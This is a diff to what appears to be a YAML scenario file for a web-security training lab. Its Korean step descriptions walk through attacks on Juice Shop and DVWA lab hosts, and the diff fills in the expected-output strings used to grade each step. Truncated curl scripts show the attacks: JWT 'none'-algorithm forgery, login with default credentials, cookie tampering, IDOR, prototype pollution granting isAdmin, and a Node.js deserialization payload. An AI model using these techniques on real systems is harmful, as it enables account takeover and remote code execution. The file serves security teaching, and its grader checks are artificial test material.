@@ -25,7 +25,7 @@ steps:
     성공하면 JWT 토큰(authentication.token)이 반환되며, 이 토큰의 직렬화된 페이로드를 역직렬화 공격에 활용합니다.
   verify:
     type: output_contains
-    expect: null
+    expect: token
     field: stdout
   target_vm: attacker
   script: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n \
@@ -49,7 +49,7 @@ steps:
     변조할 수 있습니다.
   verify:
     type: output_contains
-    expect: null
+    expect: JWT Header
     field: stdout
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
@@ -76,7 +76,7 @@ steps:
     alg 값을 신뢰하면 서명 없이도 변조된 토큰을 수용합니다. 방어: 서버에서 알고리즘을 고정하고 none을 명시적으로 거부해야 합니다.'
   verify:
     type: output_contains
-    expect: null
+    expect: Forged JWT
     field: stdout
   target_vm: attacker
   script: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr ''+/''
@@ -100,7 +100,7 @@ steps:
     값을 변조하면 서버가 검증 없이 사용하여 보안 레벨이 변경됩니다. 이것이 신뢰할 수 없는 데이터의 역직렬화 문제입니다.
   verify:
     type: output_contains
-    expect: null
+    expect: Set-Cookie
     field: stdout
   target_vm: attacker
   script: "curl -s -c /tmp/dvwa_deser.txt \\\n  -d 'username=admin&password=password&Login=Login'\
@@ -125,7 +125,7 @@ steps:
     수 있습니다. 이는 신뢰할 수 없는 데이터(쿠키)를 검증 없이 사용하는 대표적인 역직렬화 취약 패턴입니다.
   verify:
     type: output_contains
-    expect: null
+    expect: First name
     field: stdout
   target_vm: attacker
   script: SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk '{print $NF}') && echo
@@ -153,7 +153,7 @@ steps:
     변경하는 것은 직렬화된 참조를 조작하는 것과 같습니다. 서버는 반드시 요청자가 해당 객체에 접근할 권한이 있는지 검증해야 합니다.
   verify:
     type: output_contains
-    expect: null
+    expect: Basket
     field: stdout
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
@@ -180,7 +180,7 @@ steps:
     오염된 속성(isAdmin: true)이 상속되어 권한 상승이 발생합니다.'
   verify:
     type: output_contains
-    expect: null
+    expect: email
     field: stdout
   target_vm: attacker
   script: "curl -s \\\n     -X POST http://10.20.30.80:3000/api/Users/ \\\n     -H\
@@ -207,7 +207,7 @@ steps:
     시스템 명령을 실행할 수 있습니다.
   verify:
     type: output_contains
-    expect: null
+    expect: Node.js Deserialization Payload
     field: stdout
   target_vm: attacker
   script: "cat > /tmp/node_deser.json << 'JSONEOF'\n{\n  \"username\": \"attacker\"\
@@ -233,7 +233,7 @@ steps:
     _$$ND_FUNC$$_ 패턴을 차단하고, 서버 코드에서는 JSON Schema 검증, allowlist 기반 필드 필터링을 적용해야 합니다.
   verify:
     type: output_contains
-    expect: null
+    expect: ===
     field: stdout
   target_vm: attacker
   script: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
